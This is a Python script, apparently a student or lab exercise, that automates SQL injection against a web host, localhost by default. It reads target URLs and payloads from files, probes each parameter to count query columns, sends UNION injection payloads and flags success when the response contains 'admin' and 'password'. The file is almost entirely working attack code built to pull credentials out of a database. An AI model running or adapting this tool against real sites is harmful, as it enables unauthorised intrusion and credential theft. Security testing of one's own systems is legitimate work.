import requests
from itertools import permutations
import re

def readFile(fileName):
  """Reads a file and returns a list of read lines
  Parameters:
  fileName (string) -- the name of the file (path and format included)
  """
  lines = []
  try:
    with open(fileName, 'r') as f:
      for line in f:
        lines.append(line.replace('\n', ''))
  except:
    raise Exception('File', urlsFile, 'doesn\'t exists')
  return lines

def readPayloadsFile(fileName):
  """Reads the payloads file and returns a divides the attacks
  by the attack order and the number of columns
  Parameters:
  fileName (string) -- the name of the file (path and format included)
  Returns: a dictionary
  """
  attacks = {}
  try:
    with open(fileName, 'r') as f:
      for line in f:
        # expected line format step;number_of_columns;attack
        splitted = line.replace('\n', '').split(';')
        order = int(splitted[0])
        columns = int(splitted[1])
        attack = splitted[2]
        if not order in attacks:
          attacks[order] = {}
          attacks[order][columns] = [attack]
        else:
          columnsInOrder = attacks[order]
          if not columns in columnsInOrder:
            columnsInOrder[columns] = [attack]
          else:
            columnsInOrder[columns].append(attack)
  except:
    raise Exception('File', urlsFile, 'doesn\'t exists')
  return attacks

def makeRequest(method, url, data):
  if url:
    if method == 'GET' or method == 'get':
      return requests.get(url, params=data)
    else:
      return requests.post(url, data=data)


httpString = 'http://'
host = input('Insert the host (default http://localhost): ')
if not host:
  host = 'http://localhost'
else:
  while not host.startswith(httpString) or len(host) <= len(httpString):
    host = input('Host not valid.\nInsert a valid host (ex. http://localhost): ')

urlsFile = input('Insert the URLs file name (default urls.txt): ')
if not urlsFile:
  urlsFile = 'urls.txt'
payloadsFile = input('Insert the payloads file name (default payloads.txt): ')
if not payloadsFile:
  payloadsFile = 'payloads.txt'

urls = readFile(urlsFile)
payloads = readPayloadsFile(payloadsFile)

# Expected urls format: METHOD:/some/random/url/with-page.php:param1,param2,param3...
for url in urls:
  print(url)
  splitted = url.split(':')
  if len(splitted) == 3:
    httpMethod = splitted[0]
    baseUrl = splitted[1]
    params = splitted[2]
    paramsList = params.split(',')
    paramsListLen = len(paramsList)
    completeUrl = host + baseUrl

    # the first sequence of attacks (orderIndex = 1) finds the number of columns in the query
    # the second sequence of attacks (orderIndex = 2) checks if every column in the query is varchar
    # the third sequence of attacks (orderIndex = 3) tries to get (...) information
    orderIndex = 1
    columnsIndex = 1
    if orderIndex in payloads:
      foundColumnsCount = False
      isInjectable = True
      while not foundColumnsCount and isInjectable:
        if columnsIndex in payloads[orderIndex]:
          payload = payloads[orderIndex][columnsIndex]

          requestData = {}
          for j in range(paramsListLen):
            requestData[paramsList[j]] = payload

            result = makeRequest(httpMethod, completeUrl, requestData)
            # GLI ATTACCHI CON ' NON FUNZIONANO IN SEARCH BY PRICE PERCHÃˆ DEVE ESSERE NUMERO
            print(result.url)
            print(result)
            if result and result.ok:
              columnsIndex += 1
            else:
              foundColumnsCount = True
              columnsIndex -= 1
        else:
          print('Cannot make sql attacks in "' + completeUrl +'" url')
          isInjectable = False
      
      # query select type attacks
      print(columnsIndex)
      orderIndex += 1
      if isInjectable and orderIndex in payloads and columnsIndex in payloads[orderIndex]:
        attacks = payloads[orderIndex][columnsIndex]
        for i in range(len(attacks)):
          requestData = {}
          for j in range(paramsListLen):
            requestData[paramsList[j]] = attacks[i]

            result = makeRequest(httpMethod, completeUrl, requestData)
            if not result or not result.ok:
              print('Cannot make sql attacks in "' + completeUrl +'" url')
              isInjectable = False

      # union injection attacks
      orderIndex += 1
      # REFACTOR TUTTO
      if isInjectable and orderIndex in payloads and columnsIndex in payloads[orderIndex]:
        attacks = payloads[orderIndex][columnsIndex]
        for i in range(len(attacks)):
          requestData = {}
          for j in range(paramsListLen):
            requestData[paramsList[j]] = attacks[i]

            result = makeRequest(httpMethod, completeUrl, requestData)
            # print('url: ', result.url)
            if result and result.ok and result.text:
              print('result text:', result.text, '\n')
              if 'admin' in result.text and 'password' in result.text:
                print('Found a sql injection in the "' + completeUrl + '" using the "' + attacks[i] + '" attack')

